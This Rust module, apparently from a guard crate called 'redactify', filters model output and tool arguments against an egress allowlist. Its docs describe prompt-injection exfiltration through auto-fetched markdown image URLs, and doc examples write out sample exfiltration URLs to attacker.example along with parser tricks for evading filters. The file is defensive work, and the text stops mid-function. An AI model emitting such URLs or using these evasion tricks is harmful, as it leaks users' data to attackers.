//! Egress allowlist: outbound URL destinations in model output and tool
//! arguments.
//!
//! A model that has read attacker-controlled text can be steered into
//! writing a URL that carries data to the attacker's host, most often a
//! markdown image (`![x](https://attacker.example/?q=<data>)`) that the
//! chat client fetches on render without any click (MITRE ATLAS
//! AML.T0077 "LLM Response Rendering"). [`url_guard`](crate::guard::url_guard)
//! does not catch this: it judges whether a URL reaches an INTERNAL target
//! and deliberately treats public hosts as safe. This module is the
//! destination control OWASP ASI02 asks for ("enforce outbound allowlists
//! and deny all non-approved network destinations"): with an
//! [`EgressAllowlist`] configured, every URL whose host is not on the list
//! is replaced by [`BLOCKED_URL`]; without one, nothing changes (the
//! allowlist is opt-in and no other API consults it).
//!
//! # What counts as a URL
//!
//! The scanner errs towards finding too much: it looks for every form a
//! markdown renderer, an HTML renderer or a link-preview fetcher can turn
//! into a request, and a URL it cannot judge is blocked.
//!
//! - `scheme://authority` for ANY scheme (`https`, `ftp`, `ws`, a made-up
//!   one), so an entity-split scheme (`&#104;ttps://` reads as
//!   `ttps://`) is still a URL;
//! - the special schemes of the WHATWG URL Standard (`http`, `https`, `ws`,
//!   `wss`, `ftp`, `file`) followed by any run of `/` and `\`
//!   (`https:\\host`, `https:/host`), and `http:` / `https:` with no slash
//!   at all (`http:host`), which the URL parser reads as an authority (the
//!   same reading [`url_guard`](crate::guard::url_guard) documents);
//! - protocol-relative `//host` (or `\\host`) in a link position: after
//!   `(` (markdown destination, CSS `url(`), `=` (HTML attribute), a quote,
//!   `<`, or `]:` (markdown reference definition), spaces, tabs and form
//!   feeds between, also when that character ends the previous line;
//! - GitHub-flavored-markdown `www.` autolinks (`www.host`).
//!
//! Tabs and carriage returns between a scheme's colon, its slashes and the
//! authority are skipped (`https:<TAB>//host`), as the URL parser deletes
//! them. Every line is scanned as written and in the views a renderer
//! decodes it to: the markdown reading (backslash escapes and character
//! references such as `&#58;` or `&colon;`) and the HTML reading
//! (references only, a backslash is literal: `\&#101;` is `\e`); an
//! encoded tab, line feed or carriage return is deleted. A URL found in
//! any view is replaced in the original text.
//!
//! # Quoted HTML attribute values
//!
//! A quoted attribute value (`="..."`, `='...'`, also across lines) is the
//! whole string a renderer hands to the URL parser, so it is judged the way
//! the parser reads it (WHATWG URL Standard, basic URL parser): character
//! references decoded, leading and trailing C0 controls and spaces
//! stripped, every ASCII tab, line feed and carriage return removed. A
//! value that is an absolute or protocol-relative URL to a host outside the
//! allowlist is replaced. A value that continues onto later lines is judged
//! line by line as far as it goes: as soon as its host so far is not
//! allowed, the part on the current line is replaced (earlier lines are
//! already out; what remains then starts with `[BLOCKED_URL]`, which no
//! host can contain). So `src="https://allowed.example<LF>.attacker.example"`
//! and `src="https://<TAB>attacker.example"` are blocked. A side effect:
//! an allowed name split inside a label across lines (`img.cdn` +
//! `.example`) is blocked at its first line.
//!
//! # How a host is judged
//!
//! - the authority ends at `/`, `?`, `#`, ASCII whitespace and controls,
//!   `<` or `>`; NOT at non-ASCII whitespace (U+00A0, U+2003, U+3000, ...),
//!   which a markdown destination and the URL parser keep, so in
//!   `https://allowed.example<U+00A0>@attacker.example` the host is
//!   `attacker.example`. For the special schemes the authority is ALSO
//!   read as ending at `\` (WHATWG reading), and the URL passes only when
//!   the host of BOTH readings is allowed
//!   (`https://allowed.example\@attacker.example` is blocked); a host that
//!   holds an ASCII space or control character fails to parse and reaches
//!   no destination;
//! - userinfo is everything up to the LAST `@`
//!   (`https://allowed.example@attacker.example` targets
//!   `attacker.example` and is blocked); the port is ignored;
//! - the host is percent-decoded, NFKC-normalized (fullwidth letters and
//!   compatibility dots fold to ASCII), the ideographic full stops U+3002
//!   and U+FF61 become `.` (IDNA label separators), and it is ASCII
//!   lowercased;
//! - a renderer may cut the host short at a character that cannot belong
//!   to a DNS label (`)` ends a markdown destination, a quote ends an HTML
//!   attribute or a JSON string), while the URL parser itself accepts most
//!   such characters inside a host. So every prefix that ends before such
//!   a character is a candidate, and so is the whole host; trailing dots
//!   are dropped (`allowed.example.` is the same host). A candidate whose
//!   last label holds such a character, or that is longer than 253
//!   octets, cannot be looked up in the DNS (no top-level domain holds
//!   one) and reaches no destination; every other candidate must be
//!   allowed. So `allowed.example)` and the JSON `"https://allowed.example","`
//!   pass, while `attacker.example)` and
//!   `allowed.example"x.attacker.example` are blocked. More than eight
//!   candidates in one host is blocked unjudged;
//! - internationalized names match in their A-label (punycode) form only:
//!   an allowlist entry must be written that way, and a host written with
//!   non-ASCII letters never matches one (it is blocked);
//! - an IPv4 host in any notation the URL parser accepts (`16843009`,
//!   `0x1.1.1.1`, `1.1.257`) is compared in dotted-quad form; an IPv6 host
//!   only matches an entry written identically (lowercase).
//!
//! An entry is a host name (`docs.example.com`, exact match), a wildcard
//! (`*.example.com`: every subdomain, NOT `example.com` itself), an IPv4
//! address or a bracketed IPv6 address.
//!
//! # Streaming
//!
//! The filter is line-scoped, like the streaming guard: [`EgressLineFilter`]
//! emits each line as it completes and its output equals
//! [`EgressAllowlist::filter`] on the whole text for every chunking. The
//! state that crosses a line break is an open quoted attribute value (its
//! URL string so far, bounded) or a line that ended in a link position.
//!
//! # Tool arguments
//!
//! [`EgressAllowlist::is_clean`] (the tool guard's `EGRESS_HOST` check)
//! adds one reading: a tool may hand a whole argument string to a URL
//! parser, so when the string, preprocessed as above, starts with a URL
//! with a host, that host must be allowed too
//! (`"https://allowed.example<LF>.attacker.example"`, `"\f//attacker.example"`).
//! A multi-line text that starts with a URL and continues on the next line
//! without a space is judged as one URL there.
//!
//! # Limits (documented, not hidden)
//!
//! - an allowlisted host that redirects (an open redirect, or a URL nested
//!   in a percent-encoded query parameter) is outside what a host
//!   allowlist can see; a plain nested URL (`?u=https://other.example`) is
//!   scanned and blocked;
//! - a bare domain without a scheme or `www.` (`attacker.example/x`) is
//!   not treated as a URL (the GFM autolink rules do not link it; some
//!   chat clients do);
//! - `mailto:` and other schemes without an authority are not egress here.
//!
//! # Examples
//! ```
//! use redactify::guard::egress::EgressAllowlist;
//!
//! let allow = EgressAllowlist::new(["docs.example.com", "*.cdn.example.com"]).unwrap();
//! let out = allow.filter(
//!     "See ![chart](https://img.cdn.example.com/c.png) and \
//!      ![x](https://attacker.example/?q=secret).",
//! );
//! assert_eq!(
//!     out.text,
//!     "See ![chart](https://img.cdn.example.com/c.png) and ![x]([BLOCKED_URL])."
//! );
//! assert_eq!(out.blocked, 1);
//! // userinfo tricks, case and a trailing dot are judged like a browser does
//! assert!(!allow.is_clean("https://docs.example.com@attacker.example/"));
//! assert!(allow.is_clean("https://DOCS.example.com./guide"));
//! ```

use std::collections::BTreeSet;
use std::ops::Range;

use unicode_normalization::UnicodeNormalization;

/// The text a blocked URL is replaced by. It holds no `:`, `/` or `.`, so
/// it can never form (or complete) a URL itself.
pub const BLOCKED_URL: &str = "[BLOCKED_URL]";

/// Maximum number of entries in one [`EgressAllowlist`] (an allowlist read
/// from an untrusted request must stay bounded).
pub const MAX_EGRESS_ENTRIES: usize = 1024;

/// Longest accepted entry: a DNS name is at most 253 octets (RFC 1035
/// section 2.3.4), plus the `*.` wildcard prefix and a trailing dot.
const MAX_ENTRY_LEN: usize = 256;

/// Longest authority (userinfo, host and port) the scanner judges; a
/// longer one is blocked unjudged. A DNS name is at most 253 octets, three
/// times that when fully percent-encoded. The bound keeps the work per URL
/// constant, so a line of any length is scanned in linear time.
const MAX_AUTHORITY: usize = 1024;

/// Rounds of scan-and-replace per line before the whole line is replaced
/// (a replacement could in principle expose a new URL; none of the
/// property tests needs a second round, the bound only makes the loop
/// provably finite).
const MAX_ROUNDS: usize = 3;

/// Why an [`EgressAllowlist`] could not be built. Messages name the entry
/// position, never the entry text.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum EgressAllowlistError {
    /// An entry is not a host name, wildcard or IP address.
    #[error("egress allowlist entry {index}: {reason}")]
    InvalidEntry {
        /// 0-based position of the entry.
        index: usize,
        /// What is wrong with it.
        reason: &'static str,
    },
    /// More than [`MAX_EGRESS_ENTRIES`] entries.
    #[error("egress allowlist exceeds the {limit}-entry limit ({len} given)")]
    TooManyEntries {
        /// The number of entries given.
        len: usize,
        /// The limit ([`MAX_EGRESS_ENTRIES`]).
        limit: usize,
    },
}

/// The hosts that URLs in filtered text may point to (deny-by-default for
/// every other host). See the [module docs](self) for what is scanned and
/// how a host is compared.
///
/// serde (feature `serde`): serializes as the sorted list of canonical
/// entries and deserializes through [`EgressAllowlist::new`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EgressAllowlist {
    /// Exact hosts: canonical lowercase names, dotted-quad IPv4, bracketed
    /// lowercase IPv6.
    exact: BTreeSet<String>,
    /// Base domains of the `*.base` entries (subdomains only).
    wildcard: BTreeSet<String>,
    /// Most labels in a wildcard base: a host is matched against the
    /// suffixes of at most this many labels.
    wildcard_depth: usize,
}

/// The output of [`EgressAllowlist::filter`].
#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub struct EgressFiltered {
    /// The text with every URL to a non-allowlisted host replaced by
    /// [`BLOCKED_URL`].
    pub text: String,
    /// How many replacements were made (0 = the text came back unchanged).
    pub blocked: usize,
}

impl EgressAllowlist {
    /// Builds an allowlist from host entries: `host.example` (exact),
    /// `*.example.com` (subdomains of `example.com`, not the apex), an IPv4
    /// address in any notation the URL parser accepts, or a bracketed IPv6
    /// address. Entries are case-insensitive and may end in one `.`; an
    /// internationalized name must be given in its A-label (punycode)
    /// form.
    ///
    /// An empty list is valid and blocks every URL that has a host.
    ///
    /// # Errors
    /// [`EgressAllowlistError::InvalidEntry`] naming the first bad entry's
    /// position, or [`EgressAllowlistError::TooManyEntries`].
    ///
    /// # Examples
    /// ```
    /// use redactify::guard::egress::EgressAllowlist;
    ///
    /// let allow = EgressAllowlist::new(["Example.COM.", "*.cdn.example.net", "0x7f.1"]).unwrap();
    /// assert!(allow.allows_host("example.com"));
    /// assert!(allow.allows_host("a.cdn.example.net"));
    /// assert!(!allow.allows_host("cdn.example.net")); // the apex is not a subdomain
    /// assert!(allow.allows_host("127.0.0.1"));        // 0x7f.1 in dotted-quad form
    /// assert!(EgressAllowlist::new(["b\u{fc}cher.example"]).is_err()); // A-label form only
    /// ```
    pub fn new<I, S>(entries: I) -> Result<Self, EgressAllowlistError>
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let mut allow = Self {
            exact: BTreeSet::new(),
            wildcard: BTreeSet::new(),
            wildcard_depth: 0,
        };
        for (index, entry) in entries.into_iter().enumerate() {
            if index >= MAX_EGRESS_ENTRIES {
                return Err(EgressAllowlistError::TooManyEntries {
                    len: index + 1,
                    limit: MAX_EGRESS_ENTRIES,
                });
            }
            let (wild, host) = parse_entry(entry.as_ref())
                .map_err(|reason| EgressAllowlistError::InvalidEntry { index, reason })?;
            if wild {
                allow.wildcard_depth = allow.wildcard_depth.max(host.split('.').count());
                allow.wildcard.insert(host);
            } else {
                allow.exact.insert(host);
            }
        }
        Ok(allow)
    }

    /// The canonical entries, sorted: exact hosts, then `*.` wildcards
    /// (the shape [`EgressAllowlist::new`] reads back to an equal
    /// allowlist).
    pub fn entries(&self) -> impl Iterator<Item = String> + '_ {
        self.exact
            .iter()
            .cloned()
            .chain(self.wildcard.iter().map(|base| format!("*.{base}")))
    }

    /// Whether a URL host (no scheme, userinfo or port) is allowed, judged
    /// as the [module docs](self) describe: percent-decoded, NFKC,
    /// ideographic dots, lowercase; every prefix a renderer could cut the
    /// host at (before a character that cannot belong to a label) that
    /// still ends in a resolvable label must be allowed; IPv4 in any
    /// notation compares in dotted-quad form, IPv6 as written.
    ///
    /// # Examples
    /// ```
    /// use redactify::guard::egress::EgressAllowlist;
    ///
    /// let allow = EgressAllowlist::new(["ok.example"]).unwrap();
    /// assert!(allow.allows_host("OK.example."));
    /// assert!(allow.allows_host("ok%2Eexample"));
    /// assert!(allow.allows_host("ok.example)")); // `)` ends a markdown destination
    /// assert!(!allow.allows_host("ok.example).attacker.example"));
    /// assert!(!allow.allows_host("attacker.example)"));
    /// ```
    #[must_use]
    pub fn allows_host(&self, host: &str) -> bool {
        if let Some(inner) = host.strip_prefix('[') {
            // IPv6: compared as written (lowercase), nothing after `]`; a
            // bracketed text that is no IPv6 literal fails to parse and
            // reaches no destination
            let Some(inner) = inner.strip_suffix(']') else {
                return false;
            };
            let literal = inner.contains(':')
                && inner
                    .bytes()
                    .all(|c| c.is_ascii_hexdigit() || c == b':' || c == b'.');
            return !literal || self.exact.contains(&host.to_ascii_lowercase());
        }
        let Some(host) = normalize_host(host) else {
            return false;
        };
        let mut judged = 0;
        let mut candidate = |end: usize, cut: bool| -> bool {
            // a final label with a character no DNS label can hold, or a
            // name too long to look up, reaches no registered domain
            if cut || end > MAX_DNS_NAME {
                return true;
            }
            judged += 1;
            judged <= MAX_HOST_CANDIDATES && self.allows_name(&host[..end])
        };
        // the final label of `host[..k]` once trailing dots are dropped:
        // its end and whether it holds a cut character
        let final_label = |k: usize, start: usize, cut: bool, last: Option<(usize, bool)>| {
            if k > start {
                Some((k, cut))
            } else {
                last
            }
        };
        let mut label_start = 0;
        let mut label_cut = false;
        let mut last_label: Option<(usize, bool)> = None;
        for (k, c) in host.char_indices() {
            if c == '.' {
                if k > label_start {
                    last_label = Some((k, label_cut));
                }
                label_start = k + 1;
                label_cut = false;
            } else if !is_label_char(c) {
                if let Some((end, cut)) = final_label(k, label_start, label_cut, last_label) {
                    if !candidate(end, cut) {
                        return false;
                    }
                }
                label_cut = true;
            }
        }
        match final_label(host.len(), label_start, label_cut, last_label) {
            Some((end, cut)) => candidate(end, cut),
            None => false, // no label at all
        }
    }

    /// Whether `text` holds no URL to a host outside the allowlist: the
    /// check behind the tool guard's `EGRESS_HOST` code. It is the scan of
    /// [`Self::filter`] (true exactly when `filter` would change nothing),
    /// plus one stricter reading for a tool argument, which may be handed
    /// to a URL parser whole: when the text, read as the parser reads it
    /// (leading and trailing C0 controls and spaces stripped, every ASCII
    /// tab, line feed and carriage return removed), starts with a URL that
    /// has a host, that host must be allowed too. So a tool argument
    /// `"\u{c}//attacker.example"` or `"https://allowed.example<LF>.attacker.example"`
    /// is not clean, although neither renders as a link in prose.
    ///
    /// # Examples
    /// ```
    /// use redactify::guard::egress::EgressAllowlist;
    ///
    /// let allow = EgressAllowlist::new(["docs.example.com"]).unwrap();
    /// assert!(allow.is_clean("see https://docs.example.com/guide"));
    /// assert!(!allow.is_clean("https://docs.example.com\u{a0}@attacker.example/"));
    /// assert!(!allow.is_clean("https://\tattacker.example/"));
    /// assert!(!allow.is_clean("https://docs.example.com\n.attacker.example/"));
    /// ```
    #[must_use]
    pub fn is_clean(&self, text: &str) -> bool {
        let mut carry = None;
        let lines_clean = text.split('\n').all(|line| {
            let (spans, next) = self.scan_line(line, carry.as_ref(), true);
            carry = next;
            spans.is_empty()
        });
        lines_clean && self.judge_whole(text) != UrlJudgement::Blocked
    }

    /// Replaces every URL whose host is not allowed by [`BLOCKED_URL`]
    /// (see the [module docs](self) for the forms found). Text without
    /// such a URL comes back unchanged with `blocked == 0`.
    ///
    /// # Examples
    /// ```
    /// use redactify::guard::egress::EgressAllowlist;
    ///
    /// let allow = EgressAllowlist::new(["example.com"]).unwrap();
    /// let html = r#"<img src="//attacker.example/p.gif"> <a href="https://example.com/">ok</a>"#;
    /// assert_eq!(
    ///     allow.filter(html).text,
    ///     r#"<img src="[BLOCKED_URL]"> <a href="https://example.com/">ok</a>"#
    /// );
    /// ```
    #[must_use]
    pub fn filter(&self, text: &str) -> EgressFiltered {
        let mut out = String::with_capacity(text.len());
        let mut blocked = 0;
        let mut carry = None;
        for (i, line) in text.split('\n').enumerate() {
            if i > 0 {
                out.push('\n');
            }
            blocked += self.filter_line(line, &mut carry, &mut out);
        }
        EgressFiltered { text: out, blocked }
    }

    /// A streaming adapter over this allowlist: feed chunks, get filtered
    /// complete lines back (see [`EgressLineFilter`]).
    #[must_use]
    pub fn line_filter(&self) -> EgressLineFilter<'_> {
        EgressLineFilter {
            allow: self,
            pending: String::new(),
            carry: None,
            blocked: 0,
        }
    }

    /// Filters one line (no `\n`) into `out`, updating the cross-line
    /// carry; returns the number of replacements.
    fn filter_line(&self, line: &str, carry: &mut Option<Carry>, out: &mut String) -> usize {
        let mut current = std::borrow::Cow::Borrowed(line);
        let mut blocked = 0;
        let incoming = carry.take();
        for _ in 0..MAX_ROUNDS {
            // a replacement never makes the carried attribute value
            // disallowed (`[BLOCKED_URL]` ends a host at `[`), so every
            // round reads the line with the same incoming state
            let (spans, next) = self.scan_line(&current, incoming.as_ref(), false);
            if spans.is_empty() {
                *carry = next;
                out.push_str(&current);
                return blocked;
            }
            blocked += spans.len();
            current = std::borrow::Cow::Owned(replace_spans(&current, &spans));
        }
        // still not clean after the bounded rounds: fail closed
        out.push_str(BLOCKED_URL);
        blocked + 1
    }

    /// One scan of `line`: quoted HTML attribute values judged as whole URL
    /// strings, then the free-text scan of the line as written and of its
    /// decoded views. Returns the merged raw byte ranges to replace and the
    /// state the next line starts in. With `first_only`, stops at the first
    /// blocked URL.
    fn scan_line(
        &self,
        line: &str,
        carry: Option<&Carry>,
        first_only: bool,
    ) -> (Vec<Range<usize>>, Option<Carry>) {
        let mut spans = Vec::new();
        let (open_value, link_start) = match carry {
            Some(Carry::Value(v)) => (Some(v), None),
            Some(Carry::LinkPosition(c)) => (None, Some(*c)),
            None => (None, None),
        };
        let still_open = self.scan_values(line, open_value, link_start, &mut spans);
        if first_only && !spans.is_empty() {
            return (spans, None);
        }
        let at_link = link_start.is_some();
        self.scan_view(line, None, at_link, first_only, &mut spans);
        if first_only && !spans.is_empty() {
            return (spans, None);
        }
        let has_amp = line.contains('&');
        let has_backslash = line.contains('\\');
        if has_amp || has_backslash {
            // markdown reading: backslash escapes and character references
            let view = decoded_view(line, true);
            self.scan_view(
                &view.text,
                Some((&view.map, line)),
                at_link,
                first_only,
                &mut spans,
            );
            if has_amp && has_backslash && !(first_only && !spans.is_empty()) {
                // HTML reading: a backslash is literal, so `\&#101;` is
                // `\e` (in a markdown escape it would be a literal `&`)
                let view = decoded_view(line, false);
                self.scan_view(
                    &view.text,
                    Some((&view.map, line)),
                    at_link,
                    first_only,
                    &mut spans,
                );
            }
        }
        merge_spans(&mut spans);
        let next = match still_open {
            Some(v) => Some(Carry::Value(v)),
            None => trailing_link_position(line).map(Carry::LinkPosition),
        };
        (spans, next)
    }

    /// Judges every quoted HTML attribute value of `line` as the whole URL
    /// string a renderer hands to the URL parser: character references
    /// decoded, leading C0 controls and spaces stripped, ASCII tab, line
    /// feed and carriage return removed (WHATWG URL Standard, basic URL
    /// parser, input preprocessing). A value that may still continue
    /// (unclosed at the end of the line) is judged as far as it goes: a
    /// host that is not allowed so far blocks the part on this line.
    /// Returns the value still open at the end of the line.
    fn scan_values(
        &self,
        line: &str,
        open: Option<&OpenValue>,
        link_start: Option<u8>,
        spans: &mut Vec<Range<usize>>,
    ) -> Option<OpenValue> {
        let b = line.as_bytes();
        let mut pos = 0;
        if let Some(v) = open {
            let close = b.iter().position(|&c| c == v.quote);
            let end = close.unwrap_or(b.len());
            let v = self.extend_value(v.clone(), line, 0, end, close.is_some(), spans);
            match close {
                Some(c) => pos = c + 1,
                None => return v,
            }
        } else if link_start == Some(b'=') {
            // `src=` at the end of the previous line, the quote on this one
            let first = b.iter().position(|&c| !is_html_space(c));
            if let Some(q) = first.filter(|&i| b[i] == b'"' || b[i] == b'\'') {
                if let Some(v) = self.open_value(line, q, spans) {
                    return Some(v);
                }
                pos = b[q + 1..]
                    .iter()
                    .position(|&c| c == b[q])
                    .map_or(b.len(), |c| q + 1 + c + 1);
            }
        }
        while let Some(eq) = b[pos..].iter().position(|&c| c == b'=').map(|i| pos + i) {
            let mut q = eq + 1;
            while q < b.len() && is_html_space(b[q]) {
                q += 1;
            }
            if q >= b.len() || (b[q] != b'"' && b[q] != b'\'') {
                pos = eq + 1;
                continue;
            }
            if let Some(v) = self.open_value(line, q, spans) {
                return Some(v);
            }
            // the value closed on this line: continue after its quote
            pos = b[q + 1..]
                .iter()
                .position(|&c| c == b[q])
                .map_or(b.len(), |c| q + 1 + c + 1);
        }
        None
    }

    /// Opens the attribute value whose quote is at `q`; returns it when it
    /// is still open at the end of the line.
    fn open_value(&self, line: &str, q: usize, spans: &mut Vec<Range<usize>>) -> Option<OpenValue> {
        let b = line.as_bytes();
        let quote = b[q];
        let start = q + 1;
        let close = b[start..]
            .iter()
            .position(|&c| c == quote)
            .map(|c| start + c);
        let value = OpenValue {
            quote,
            url: String::new(),
            decided: false,
        };
        self.extend_value(
            value,
            line,
            start,
            close.unwrap_or(b.len()),
            close.is_some(),
            spans,
        )
    }

    /// Adds `line[start..end]` (a part of an attribute value) to the URL
    /// string of `value` and judges it; a blocked judgement replaces this
    /// part. Returns the value when it is still open (`closed == false`).
    fn extend_value(
        &self,
        mut value: OpenValue,
        line: &str,
        start: usize,
        end: usize,
        closed: bool,
        spans: &mut Vec<Range<usize>>,
    ) -> Option<OpenValue> {
        if !value.decided {
            let complete = push_url_text(&mut value.url, &line[start..end], true);
            // judged as if trailing C0 controls and spaces were the end
            // (the parser strips them there; inside a host they fail it)
            let url = value.url.trim_end_matches(|c: char| c <= ' ');
            let verdict = if complete {
                judge_url(self, url, closed)
            } else {
                // longer than any judgeable URL start: decide on what is
                // there (an authority this long is blocked by `judge_url`)
                match judge_url(self, url, true) {
                    UrlJudgement::Blocked => UrlJudgement::Blocked,
                    _ => UrlJudgement::Safe,
                }
            };
            match verdict {
                UrlJudgement::Blocked => {
                    if end > start {
                        spans.push(start..end);
                    }
                    value.decided = true;
                }
                UrlJudgement::Safe => value.decided = true,
                UrlJudgement::Undecided => {}
            }
        }
        (!closed).then_some(value)
    }

    /// The stricter whole-text reading of [`Self::is_clean`].
    fn judge_whole(&self, text: &str) -> UrlJudgement {
        let mut url = String::new();
        let complete = push_url_text(&mut url, text, false);
        // a text longer than the bounded prefix is judged on that prefix;
        // a URL start that long is left to the line scan
        match judge_url(self, url.trim_end_matches(|c: char| c <= ' '), complete) {
            UrlJudgement::Undecided => UrlJudgement::Safe,
            j => j,
        }
    }

    /// Scans one view of a line, pushing the RAW byte range of every
    /// blocked URL (`map` translates view offsets to raw offsets; `None` =
    /// the view is the raw line). `at_link`: the line starts in a link
    /// position (the previous line ended with `(`, `=`, `<` or `]:`).
    fn scan_view(
        &self,
        view: &str,
        map: Option<(&[usize], &str)>,
        at_link: bool,
        first_only: bool,
        spans: &mut Vec<Range<usize>>,
    ) {
        let mut pos = 0;
        while let Some(hit) = next_hit(view, pos, at_link) {
            let whatwg_end = authority_end(view, hit.auth, true);
            let plain_end = authority_end(view, hit.auth, false);
            let allowed = match (whatwg_end, plain_end) {
                (Some(w), Some(p)) => {
                    if hit.slashless && is_port_shaped(&view[hit.auth..w]) {
                        pos = w;
                        continue;
                    }
                    (!hit.special || self.authority_allowed(&view[hit.auth..w], hit.special))
                        && self.authority_allowed(&view[hit.auth..p], hit.special)
                }
                _ => false,
            };
            if allowed {
                // nested URLs in the path and query are scanned too
                pos = whatwg_end.unwrap_or(hit.auth).max(hit.auth + 1);
            } else {
                let end = token_end(view, hit.start, hit.auth);
                spans.push(match map {
                    // a decoded URL never extends across whitespace of the
                    // raw line: the range still holds the authority start
                    Some((m, raw)) => clamp_to_raw_token(raw, m[hit.start], m[hit.auth], m[end]),
                    None => hit.start..end,
                });
                if first_only {
                    return;
                }
                pos = end.max(hit.auth + 1);
            }
        }
    }

    /// Whether the host of `authority` (userinfo and port included) is
    /// allowed. An empty host is not a destination (`file:///`), and
    /// neither is a host that holds an ASCII space or control character:
    /// the URL parser refuses it (forbidden host code points).
    fn authority_allowed(&self, authority: &str, special: bool) -> bool {
        let hostport = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
        let host = if hostport.starts_with('[') {
            match hostport.find(']') {
                Some(end) => &hostport[..=end],
                None => return false,
            }
        } else {
            hostport.split(':').next().unwrap_or(hostport)
        };
        if host.is_empty() {
            // `https://` with no host is a parse failure for a special
            // scheme and the local host for `file`: no destination
            return special;
        }
        if host.bytes().any(|c| c <= b' ' || c == 0x7f) {
            return true;
        }
        self.allows_host(host)
    }

    /// Whether a resolvable name (or an IPv4 address in any notation) is an
    /// exact entry or a subdomain of a wildcard base.
    fn allows_name(&self, name: &str) -> bool {
        if let Some(ip) = crate::guard::rules::parse_ipv4_lenient(name) {
            return self.exact.contains(&dotted(ip));
        }
        self.exact.contains(name)
            || name
                .rmatch_indices('.')
                .take(self.wildcard_depth)
                .any(|(i, _)| self.wildcard.contains(&name[i + 1..]))
    }
}

#[cfg(feature = "serde")]
impl serde::Serialize for EgressAllowlist {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> Result<S::Ok, S::Error> {
        serializer.collect_seq(self.entries())
    }
}

#[cfg(feature = "serde")]
impl<'de> serde::Deserialize<'de> for EgressAllowlist {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
        let entries = Vec::<String>::deserialize(deserializer)?;
        Self::new(entries).map_err(serde::de::Error::custom)
    }
}

/// Streaming adapter of [`EgressAllowlist::filter`]: [`push`](Self::push)
/// chunks of any size (split anywhere, even inside a UTF-8 character's
/// string boundary is impossible since chunks are `&str`) and get back
/// every line completed so far, filtered; [`finish`](Self::finish)
/// flushes the last, unterminated line. The concatenated output equals
/// `filter(whole_text).text` for every chunking.
///
/// Compose it after the streaming guard: feed it the text of each
/// `GuardEvent::Segment`.
///
/// # Examples
/// ```
/// use redactify::guard::egress::EgressAllowlist;
///
/// let allow = EgressAllowlist::new(["example.com"]).unwrap();
/// let mut f = allow.line_filter();
/// let mut out = f.push("![a](https://attac");
/// assert_eq!(out, ""); // the line is still open
/// out += &f.push("ker.example/x.png)\nok https://example.com\n");
/// out += &f.finish();
/// assert_eq!(out, "![a]([BLOCKED_URL])\nok https://example.com\n");
/// assert_eq!(f.blocked(), 1);
/// ```
#[derive(Debug)]
pub struct EgressLineFilter<'a> {
    allow: &'a EgressAllowlist,
    /// The open (unterminated) line.
    pending: String,
    /// The state carried across the last line break.
    carry: Option<Carry>,
    /// Replacements made so far.
    blocked: usize,
}

impl EgressLineFilter<'_> {
    /// Adds a chunk; returns the filtered text of every line it completes
    /// (each with its `\n`), or an empty string while the line is open.
    pub fn push(&mut self, chunk: &str) -> String {
        let mut out = String::new();
        let mut rest = chunk;
        while let Some(nl) = rest.find('\n') {
            self.pending.push_str(&rest[..nl]);
            let line = std::mem::take(&mut self.pending);
            self.blocked += self.allow.filter_line(&line, &mut self.carry, &mut out);
            out.push('\n');
            rest = &rest[nl + 1..];
        }
        self.pending.push_str(rest);
        out
    }

    /// Flushes the open line (filtered); the filter can be reused for a
    /// new text afterwards.
    pub fn finish(&mut self) -> String {
        let mut out = String::new();
        let line = std::mem::take(&mut self.pending);
        self.blocked += self.allow.filter_line(&line, &mut self.carry, &mut out);
        self.carry = None;
        out
    }

    /// Replacements made so far.
    #[must_use]
    pub const fn blocked(&self) -> usize {
        self.blocked
    }
}

/// The state a line starts in, carried across the line break.
#[derive(Debug, Clone)]
enum Carry {
    /// Inside a quoted HTML attribute value opened on an earlier line (the
    /// URL parser deletes the line feeds, so the lines join).
    Value(OpenValue),
    /// The previous line ended in a link position: `(` (markdown
    /// destination, CSS `url(`), `=` (HTML attribute), `<`, or `]:`
    /// (markdown reference definition, stored as `:`).
    LinkPosition(u8),
}

/// A quoted HTML attribute value that is still open.
#[derive(Debug, Clone)]
struct OpenValue {
    quote: u8,
    /// The URL string so far, as the parser reads it (character references
    /// decoded, leading C0 and spaces stripped, tab and newlines removed),
    /// bounded by [`MAX_URL_PREFIX`].
    url: String,
    /// Judged already (allowed host, not a URL, or blocked and replaced).
    decided: bool,
}

/// The judgement of a URL string that may still grow.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum UrlJudgement {
    /// Its host is allowed so far, or no host has started yet.
    Undecided,
    /// Not a URL with a host, or a complete allowed host.
    Safe,
    /// A host that is not allowed (even if the string ends here).
    Blocked,
}

/// The longest URL-string prefix kept for a judgement: a scheme, slashes
/// and an authority of at most [`MAX_AUTHORITY`] bytes fit well inside.
const MAX_URL_PREFIX: usize = 4096;

/// HTML whitespace (the bytes that may surround `=` in an attribute and
/// precede an unquoted value): tab, line feed, form feed, carriage
/// return, space.
fn is_html_space(c: u8) -> bool {
    matches!(c, b'\t' | b'\n' | b'\x0c' | b'\r' | b' ')
}

/// Tab and carriage return: deleted by the URL parser, so they are
/// transparent between a scheme, its slashes and the authority start.
fn is_tab_cr(c: u8) -> bool {
    c == b'\t' || c == b'\r'
}

/// The link-position character a line ends with (trailing HTML
/// whitespace ignored), if any.
fn trailing_link_position(line: &str) -> Option<u8> {
    let b = line.as_bytes();
    let end = b.iter().rposition(|&c| !is_html_space(c))?;
    match b[end] {
        c @ (b'(' | b'=' | b'<') => Some(c),
        b':' if end > 0 && b[end - 1] == b']' => Some(b':'),
        _ => None,
    }
}

/// Appends `part` to a URL string the way the URL parser preprocesses its
/// input: character references decoded (`decode_refs`, for HTML attribute
/// values), ASCII tab, line feed and carriage return removed, leading C0
/// controls and spaces stripped. Returns `false` when the string reached
/// [`MAX_URL_PREFIX`] (the rest is not kept).
fn push_url_text(url: &mut String, part: &str, decode_refs: bool) -> bool {
    let b = part.as_bytes();
    let mut i = 0;
    while i < b.len() {
        if url.len() >= MAX_URL_PREFIX {
            return false;
        }
        let (c, len) = match (decode_refs && b[i] == b'&')
            .then(|| char_ref(part, i))
            .flatten()
        {
            Some(r) => r,
            None => {
                let c = part[i..].chars().next().unwrap_or('\u{FFFD}');
                (c, c.len_utf8())
